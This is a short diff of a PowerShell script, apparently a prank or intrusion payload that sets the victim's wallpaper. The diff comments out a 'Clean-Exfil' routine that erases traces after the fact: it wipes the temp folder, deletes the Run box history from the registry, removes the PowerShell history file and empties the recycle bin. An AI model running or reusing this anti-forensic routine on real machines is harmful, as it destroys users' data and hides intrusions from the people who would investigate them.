@@ -82,23 +82,23 @@ $o=New-Object -ComObject WScript.Shell
     }
 }
 
-function Clean-Exfil { 
+#function Clean-Exfil { 
 
 # empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+#rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+#reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+#Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Empty recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+#Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-}
+#}
 
 
 Target-Comes
 Set-WallPaper -Image $wp -Style Fill
-Clean-Exfil
+#Clean-Exfil
